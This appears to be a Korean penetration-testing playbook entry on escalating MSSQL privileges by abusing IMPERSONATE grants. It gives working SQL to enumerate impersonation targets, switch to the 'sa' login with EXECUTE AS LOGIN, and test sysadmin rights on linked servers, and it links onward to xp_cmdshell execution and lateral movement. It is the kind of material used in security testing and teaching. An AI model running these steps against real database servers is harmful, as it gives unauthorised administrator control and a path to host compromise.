---
tags:
  - 서비스/mssql
시작조건: ["MSSQL 인증 성공", "현재 login이 sysadmin이 아님"]
필요권한: ["IMPERSONATE 권한"]
필요조건: ["유효한 MSSQL 계정", "impersonate 가능한 login 후보"]
결과: ["DB 권한 상승", "sysadmin 권한", "명령 실행 단서", "linked server 권한"]
---

# MSSQL Impersonation 권한 상승

## 한 줄 판단

현재 MSSQL 로그인에 다른 SQL login을 가장하는 `IMPERSONATE` 권한이 있다면, `EXECUTE AS LOGIN`으로 데이터베이스 실행 주체를 바꾼 뒤 현재 서버와 linked server에서 `sysadmin`인지 확인한다. 이 결과는 데이터베이스 권한이며, 호스트 관리자 권한은 `xp_cmdshell`의 `hostname`과 `whoami`로 별도 확인한다.

## 사용할 때

- MSSQL 로그인에는 성공했지만 현재 계정이 sysadmin이 아닐 때.
- `IMPERSONATE` 권한으로 `sa` 또는 더 높은 권한의 login을 가장할 수 있을 때.
- `xp_cmdshell`, 파일 접근, linked server 확인 전에 DB 권한 상승 가능성을 먼저 판단해야 할 때.
- 현재 login은 낮은 권한이지만 impersonate한 login으로 linked server에 접근하면 더 높은 원격 login으로 매핑될 가능성이 있을 때.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| MSSQL 접속 | `impacket-mssqlclient`, `sqlcmd`, `sqsh` | query 실행 가능 |
| impersonate 후보 | `sys.server_permissions` | `IMPERSONATE` 대상 login 확인 |
| 권한 변화 확인 | `SYSTEM_USER`, `IS_SRVROLEMEMBER` | 컨텍스트 전환 및 sysadmin 여부 확인 |
| 원래 login 확인 | `ORIGINAL_LOGIN()` | SQL impersonation과 최초 접속 계정 구분 |

## 실행

### 선택 기준
| 단서 | 의미 | 다음 행동 |
|---|---|---|
| `IMPERSONATE` 대상이 `sa` | sysadmin 상승 가능성 높음 | `EXECUTE AS LOGIN` 검증 |
| 컨텍스트 전환 성공 | DB 권한 상승 성공 | sysadmin 여부와 xp_cmdshell 가능성 확인 |
| sysadmin이 아님 | 권한 상승 제한 | 데이터 열거, linked server, 다른 login 후보 확인 |
| impersonate 후 linked server에서 `sysadmin = 1` | linked server login mapping으로 권한 상승 | [[MSSQL xp_cmdshell 명령 실행]]에서 원격 설정 기준선과 실행 위치 확인 |

### 절차
1. 현재 MSSQL 사용자와 sysadmin 여부를 확인한다.
2. `IMPERSONATE` 가능한 login 후보를 열거한다.
3. `EXECUTE AS LOGIN`으로 컨텍스트를 전환한다.
4. 전환된 컨텍스트의 sysadmin 여부와 후속 명령 실행 가능성을 확인한다.
5. sysadmin이 아니어도 linked server가 있으면 impersonated context로 원격 query를 다시 시도한다.

### 현재 권한 확인

```sql
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

확인할 출력:

- 현재 login과 sysadmin 여부.
- `SYSTEM_USER`는 현재 실행 컨텍스트이고, `ORIGINAL_LOGIN()`은 최초 접속 계정이다.

### impersonate 후보 확인

```sql
SELECT pe.state_desc, pe.permission_name, grantor.name AS grantor, grantee.name AS grantee, target.name AS impersonate_target
FROM sys.server_permissions pe
JOIN sys.server_principals grantor ON pe.grantor_principal_id = grantor.principal_id
JOIN sys.server_principals grantee ON pe.grantee_principal_id = grantee.principal_id
JOIN sys.server_principals target ON pe.major_id = target.principal_id
WHERE pe.permission_name = 'IMPERSONATE';
```

확인할 출력:

- `grantee`가 권한을 받은 login/group이고, `impersonate_target`이 실제로 가장할 수 있는 대상이다.
- `grantor`는 권한을 부여한 주체이므로 단독으로 해석하지 않는다.

### impersonation 수행

```sql
USE master;
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
SELECT IS_SRVROLEMEMBER('sysadmin');
REVERT;
```

확인할 출력:

- `SYSTEM_USER`가 바뀐다.
- `ORIGINAL_LOGIN()`은 최초 접속 계정으로 유지된다.
- sysadmin 여부가 `1`이면 후속 명령 실행 가능성이 생긴다.

### impersonation 후 linked server 권한 확인

```sql
USE master;
EXECUTE AS LOGIN = '<IMPERSONATE_TARGET>';
SELECT SYSTEM_USER;
SELECT ORIGINAL_LOGIN();
EXECUTE('SELECT CAST(@@SERVERNAME AS varchar(40)) AS server, CAST(SYSTEM_USER AS varchar(40)) AS login, IS_SRVROLEMEMBER(''sysadmin'') AS sysadmin') AT [<LINKED_SERVER>];
REVERT;
```

확인할 출력:

- linked server 쿼리가 성공하면 원격 SQL 서버명, 원격 login, sysadmin 여부가 나온다.
- 현재 서버에서는 sysadmin이 아니어도 linked server에서 저장된 login mapping 때문에 `sysadmin = 1`이 될 수 있다.
- linked server가 동일 호스트를 가리킬 수 있으므로 후속 `hostname`, `whoami`로 OS 명령 실행 위치를 확인한다.

### linked server의 OS 명령 경로로 전환

위의 원격 query에서 `sysadmin = 1`을 확인했으면 [[MSSQL xp_cmdshell 명령 실행]]의 linked server 절차로 전환한다. 그 문서에서 원격 `show advanced options`·`xp_cmdshell`의 변경 전 값을 기록하고, `hostname`·`whoami` 실행과 설정 복구를 한 흐름으로 수행한다. 이 문서에서는 impersonation 확인과 별개인 영속 서버 설정을 중복 변경하지 않는다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| `SYSTEM_USER`가 대상 login으로 바뀌고 `ORIGINAL_LOGIN()`은 유지됨 | SQL login impersonation 성공 | DB 권한 상승 | `IS_SRVROLEMEMBER('sysadmin')`과 접근 범위 확인 |
| `IS_SRVROLEMEMBER('sysadmin') = 1` | 현재 실행 컨텍스트가 sysadmin임 | sysadmin 권한 | [[MSSQL xp_cmdshell 명령 실행]]과 파일 작업 가능성 확인 |
| 현재 서버에서는 낮은 권한이지만 linked server에서 원격 login이 바뀌고 `sysadmin = 1` | login mapping을 통해 원격 권한이 확장됨 | linked server 고권한 접근 | 원격 `hostname`, `whoami`로 실행 위치와 OS 권한 확인 |
| impersonate 후보가 없거나 `EXECUTE AS`가 거부됨 | 현재 login에 사용할 서버 수준 impersonation 경로가 없음 | 기존 DB 권한 유지 | `USE master`, login 이름을 재확인한 뒤 [[DB 인증과 데이터 열거]]로 전환 |
| 전환은 성공했지만 sysadmin이 아님 | 컨텍스트만 바뀌었고 관리자 권한은 없음 | 제한된 DB 권한 | 접근 가능한 DB, linked server, 자격 증명 확인 |
| linked query가 `untrusted domain`으로 실패함 | Windows 통합 인증 위임 또는 신뢰가 맞지 않음 | 원격 DB 접근 미확보 | 다른 impersonate 대상과 저장된 linked login mapping 확인 |

## 확인할 출력과 권한

| 확인 지점 | 확인할 출력 | 권한 판단 |
|---|---|---|
| 현재와 최초 login | `SYSTEM_USER`, `ORIGINAL_LOGIN()` | SQL impersonation과 최초 인증 계정을 구분 |
| 서버 역할 | `IS_SRVROLEMEMBER('sysadmin')`의 `1`, `0`, `NULL` | sysadmin 여부를 추정하지 않고 반환값으로 확정 |
| linked server | 원격 서버명, 원격 login, 원격 `sysadmin` 값 | 로컬 DB 권한과 원격 DB 권한을 분리 |
| OS 실행 | `hostname`, `whoami` | 실행 호스트와 SQL Server 서비스 계정 또는 SYSTEM 권한을 분리 |

## 변경 영향과 복구

`EXECUTE AS LOGIN`은 현재 SQL session의 실행 context만 바꾼다. 각 확인 block에서 `REVERT`를 실행하고 아래 출력에서 현재 login이 원래 값으로 돌아왔는지 확인한다.

```sql
REVERT;
SELECT SYSTEM_USER AS current_login, ORIGINAL_LOGIN() AS original_login;
```

두 값이 원래 login과 일치해야 impersonation context가 정리된 것이다. query 오류로 `REVERT`를 확인하지 못했으면 해당 SQL 연결을 종료한다. 이 문서의 수정된 절차는 login·role·linked server 설정이나 `xp_cmdshell` 설정을 변경하지 않는다.

## 후속 공격 연결

- [[MSSQL xp_cmdshell 명령 실행]]
- [[DB 서버 파일 수집]]
- [[MSSQL Linked Server 내부 이동]]

## 관련 서비스

- [[MSSQL 서비스]]

## 관련 도구

- [[impacket-mssqlclient]]
- [[sqlcmd]]
- [[sqsh]]
